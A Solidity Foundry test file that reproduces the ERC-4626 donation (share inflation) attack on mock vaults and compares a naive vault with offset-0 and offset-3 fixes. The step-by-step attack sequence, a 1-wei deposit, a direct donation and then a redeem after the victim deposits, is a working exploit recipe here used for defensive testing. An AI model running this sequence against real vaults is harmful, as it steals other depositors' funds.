// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";
import {IVault} from "../src/IVault.sol";
import {MockERC20} from "../src/MockERC20.sol";
import {NaiveVault} from "../src/NaiveVault.sol";
import {OZVault} from "../src/OZVault.sol";

/// @title Deterministic repro of the donation/inflation attack (harness-patterns §5).
/// A quantitative rediscovery proof that does NOT depend on the fuzzer/shrinker: the same scenario
/// on the vulnerable and fixed targets, with explicit accounting of attacker profit and victim loss.
/// Scenario: attacker deposit(1 wei) → donate(DONATION) directly → victim deposit(VICTIM) → attacker redeem all.
contract DonationAttackRepro is Test {
    MockERC20 internal token;
    address internal constant ATTACKER = address(0xA11CE);
    address internal constant VICTIM = address(0xB0B);

    uint256 internal constant DONATION = 1e21;
    uint256 internal constant VICTIM_DEPOSIT = 1e21;

    function _fund(address a, uint256 amt) internal {
        token.mint(a, amt);
    }

    /// Returns the attacker profit (assets) and the victim loss (assets).
    function _run(IVault v) internal returns (int256 attackerProfit, uint256 victimLoss) {
        // 1) attacker — first depositor: 1 wei
        _fund(ATTACKER, 1);
        vm.prank(ATTACKER);
        token.approve(address(v), type(uint256).max);
        vm.prank(ATTACKER);
        v.deposit(1, ATTACKER);

        // 2) attacker donates a large amount directly to the vault (bypassing deposit)
        _fund(ATTACKER, DONATION);
        vm.prank(ATTACKER);
        token.transfer(address(v), DONATION);

        // 3) the victim makes a legitimate deposit
        _fund(VICTIM, VICTIM_DEPOSIT);
        vm.prank(VICTIM);
        token.approve(address(v), type(uint256).max);
        vm.prank(VICTIM);
        v.deposit(VICTIM_DEPOSIT, VICTIM);

        // 4) attacker exits in full
        uint256 sh = v.balanceOf(ATTACKER);
        if (sh > 0) {
            vm.prank(ATTACKER);
            v.redeem(sh, ATTACKER, ATTACKER);
        }

        // accounting: attacker was credited 1 + DONATION; in hand now — only what was pulled out of the vault
        uint256 attackerIn = 1 + DONATION;
        uint256 attackerOut = token.balanceOf(ATTACKER);
        attackerProfit = int256(attackerOut) - int256(attackerIn);

        uint256 victimRedeemable = v.previewRedeem(v.balanceOf(VICTIM));
        victimLoss = VICTIM_DEPOSIT > victimRedeemable ? VICTIM_DEPOSIT - victimRedeemable : 0;
    }

    function test_repro_naive_profitable() public {
        token = new MockERC20();
        NaiveVault v = new NaiveVault(token);
        (int256 p, uint256 loss) = _run(IVault(address(v)));
        console2.log("NAIVE  attacker profit (assets):");
        console2.logInt(p);
        console2.log("NAIVE  victim   loss   (assets):", loss);
        // vulnerable target: the attack MUST be profitable
        assertGt(p, 0, "naive: attack NOT profitable (unexpected)");
    }

    function test_repro_oz0_weakfix() public {
        token = new MockERC20();
        OZVault v = new OZVault(token, 0); // offset=0 — a weak fix
        (int256 p, uint256 loss) = _run(IVault(address(v)));
        console2.log("OZ(0)  attacker profit (assets):");
        console2.logInt(p);
        console2.log("OZ(0)  victim   loss   (assets):", loss);
        // offset=0: on a SIMPLE canonical scenario profit is no longer positive (the virtual +1 removes the primitive);
        // the weakness of offset=0 shows on COMPLEX multi-operation sequences (caught by I2 fuzzing).
        assertLe(p, 0, "oz0: simple canonical attack unexpectedly profitable");
    }

    function test_repro_oz3_safe() public {
        token = new MockERC20();
        OZVault v = new OZVault(token, 3); // offset=3 — the correct fix
        (int256 p, uint256 loss) = _run(IVault(address(v)));
        console2.log("OZ(3)  attacker profit (assets):");
        console2.logInt(p);
        console2.log("OZ(3)  victim   loss   (assets):", loss);
        // fixed target: the attack must NOT be profitable
        assertLe(p, 0, "oz: attack profitable (fix broken)");
    }
}
